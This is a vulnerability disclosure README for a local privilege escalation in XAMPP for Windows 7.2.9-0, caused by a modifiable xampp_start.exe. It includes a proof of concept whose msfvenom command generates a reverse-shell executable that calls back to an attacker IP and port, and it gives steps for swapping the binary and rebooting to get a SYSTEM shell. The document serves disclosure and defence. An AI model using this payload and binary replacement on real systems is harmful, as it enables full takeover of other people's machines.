# XAMPP_LPE
Local Privilege Escalation in XAMPP for Windows via Writable xampp_start.exe

Product:
XAMPP for Windows

Vendor:
Bitnami / Apache Friends

Affected Version:
7.2.9-0 (2018-08-27 release for Windows)

Vulnerability Type:
Local Privilege Escalation (LPE)

Attack Vector:
Local

Privileges Required:
Low

User Interaction Required:
No

Impact:
Escalation to NT AUTHORITY\SYSTEM

**Description:**
In XAMPP for Windows version 7.2.9-0, the xampp_start.exe file located at C:\xampp\xampp_start.exe is installed with insecure permissions. Specifically, the Authenticated Users group has (M) (Modify) permission on the file, which allows any standard local user to overwrite the executable.

Since xampp_start.exe is executed with SYSTEM privileges (e.g., via Windows service, scheduled task, or autorun configuration), an attacker can replace the binary with a malicious executable such as a reverse shell. Upon system reboot, the attacker gains arbitrary code execution as NT AUTHORITY\SYSTEM.

**Permissions Output (icacls) fo C:\xampp\xampp_start.exe :**

```
BUILTIN\Administrators:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Users:(I)(RX)
NT AUTHORITY\Authenticated Users:(I)(M)
```


**Proof of Concept (PoC):**

1. Log in as a standard user.
2. Replace C:\xampp\xampp_start.exe with a reverse shell or other SYSTEM payload.
3. Reboot the machine.
4. Observe the payload executing as SYSTEM (whoami → NT AUTHORITY\SYSTEM).


Step 1:

![teste](https://raw.githubusercontent.com/painoob/XAMPP_LPE/refs/heads/main/img/Pasted%20image%2020250724134438.png)

Step 2:

Generate the reverse shell payload:
![](https://raw.githubusercontent.com/painoob/XAMPP_LPE/refs/heads/main/img/Pasted%20image%2020250724134302.png)

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.173.189 LPORT=4444 -f exe -o rev.exe
```

Start a webserver:

![](https://raw.githubusercontent.com/painoob/XAMPP_LPE/refs/heads/main/img/Pasted%20image%2020250724134744.png)

Download the payload to the path:  
![](https://raw.githubusercontent.com/painoob/XAMPP_LPE/refs/heads/main/img/Pasted%20image%2020250724134830.png)

Start the listener:  
![](https://raw.githubusercontent.com/painoob/XAMPP_LPE/refs/heads/main/img/Pasted%20image%2020250724134934.png)

Reboot the machine:  
![](https://raw.githubusercontent.com/painoob/XAMPP_LPE/refs/heads/main/img/Pasted%20image%2020250724135046.png)

Receive the "nt authority\system" shell:  
![](https://raw.githubusercontent.com/painoob/XAMPP_LPE/refs/heads/main/img/Pasted%20image%2020250724135220.png)

